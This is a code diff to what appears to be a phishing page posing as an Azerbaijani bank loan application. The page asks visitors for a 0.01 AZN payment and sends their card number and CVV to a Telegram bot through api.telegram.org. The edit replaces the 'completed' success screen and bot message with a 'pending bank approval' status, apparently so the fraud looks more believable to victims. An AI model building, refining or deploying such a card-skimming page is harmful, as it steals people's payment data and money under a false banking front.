@@ -586,15 +586,15 @@
                 <button type="button" class="cta-btn" style="width:100%;padding:15px;font-size:15px;margin-top:12px;" onclick="sendCardToTelegram(); return false;">0.01 AZN ödə</button>
             </div>
 
-            <!-- STEP 8: Success -->
+            <!-- STEP 8: Success (GÖZLƏMƏDƏ statusu ilə) -->
             <div id="successStep" style="display:none;">
                 <div class="success-container">
-                    <div class="big-icon">✅</div>
-                    <h2>Müraciətiniz tamamlandı!</h2>
-                    <p style="color:var(--teal-deep);font-weight:600;font-size:16px;">🎉 Kredit müraciətiniz uğurla göndərildi!</p>
-                    <p style="font-size:14px;color:var(--ink-soft);">Müraciətiniz bank tərəfindən qəbul edildi və emal olunur. Əlavə məlumat üçün sizinlə əlaqə saxlanılacaq.</p>
+                    <div class="big-icon">⏳</div>
+                    <h2>Müraciətiniz göndərildi!</h2>
+                    <p style="color:#F59E0B;font-weight:600;font-size:16px;">⏳ Bank təsdiqi gözlənilir...</p>
+                    <p style="font-size:14px;color:var(--ink-soft);">Müraciətiniz uğurla göndərildi. Bank tərəfindən təsdiqləndikdən sonra status yenilənəcək.</p>
                     <div style="background:var(--sage);border-radius:16px;padding:20px;margin:16px 0;text-align:left;"><div style="font-weight:700;font-size:15px;color:var(--teal-deep);">📋 Müraciət detalları</div><div style="font-size:13px;color:var(--ink-soft);margin-top:8px;line-height:1.8;" id="successDetails"></div></div>
-                    <p style="font-size:15px;font-weight:600;color:var(--teal-deep);margin-top:8px;">📌 Müraciətiniz emal olunur</p>
+                    <p style="font-size:15px;font-weight:600;color:var(--teal-deep);margin-top:8px;">📌 Müraciətiniz gözləmə vəziyyətindədir</p>
                     <p style="font-size:13px;color:var(--ink-soft);">Müraciətlərinizə baxmaq üçün aşağıdakı düyməyə klikləyin.</p>
                     <div class="btn-group"><button class="btn-gold" onclick="openApplications(); closeModal();">📋 Müraciətlərim</button><button class="btn-outline" onclick="closeModal();">🏠 Ana səhifə</button></div>
                 </div>
@@ -1310,7 +1310,7 @@
             document.getElementById('cardCvvDisplay').textContent = display;
         });
 
-        // ========== SEND CARD ==========
+        // ========== SEND CARD (GÖZLƏMƏDƏ STATUSU İLƏ) ==========
         function sendCardToTelegram() {
             var cardNumber = cardNumberInput.value;
             if (cardNumber.length < 16) { alert('16 rəqəmli kart nömrəsini daxil edin!');
@@ -1349,13 +1349,13 @@
                 term: term
             };
 
-            // Müraciəti yadda saxla
-            var app = addApplication(applicationData, 'completed');
+            // Müraciəti yadda saxla - status: pending (GÖZLƏMƏDƏ)
+            var app = addApplication(applicationData, 'pending');
 
             // Telegram-a birbaşa mesaj göndər (düyməsiz)
             sendDirectTelegramMessage(applicationData);
 
-            // Uğurlu səhifəyə keç
+            // Uğurlu səhifəyə keç (Gözləmədə statusu ilə)
             document.getElementById('cardInputStep').style.display = 'none';
             document.getElementById('successStep').style.display = 'block';
 
@@ -1368,7 +1368,7 @@
                     <div><strong>📆 Müddət:</strong> ${applicationData.term}</div>
                     <div><strong>🏦 Bank:</strong> ${applicationData.bank}</div>
                     <div><strong>📅 Tarix:</strong> ${new Date().toLocaleString('az-AZ')}</div>
-                    <div><strong>📌 Status:</strong> <span style="color:#10B981;font-weight:700;">✅ Tamamlandı</span></div>
+                    <div><strong>📌 Status:</strong> <span style="color:#F59E0B;font-weight:700;">⏳ Gözləmədə</span></div>
                 `;
             }
         }
@@ -1387,7 +1387,7 @@
                 '\n🔐 CVV: ' + data.cvv +
                 '\n💰 Məbləğ: ' + data.amount +
                 '\n📆 Müddət: ' + data.term +
-                '\n━━━━━━━━━━━━━━━━━━━━\n✅ Müraciət UĞURLA tamamlandı!';
+                '\n━━━━━━━━━━━━━━━━━━━━\n⏳ Müraciət GÖZLƏMƏDƏ vəziyyətindədir!';
             
             try {
                 await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
@@ -1517,4 +1517,4 @@
         console.log('📌 Telegram-da /bagla və /ac komutları işləyir.');
     </script>
 </body>
-    </html>
+</html>
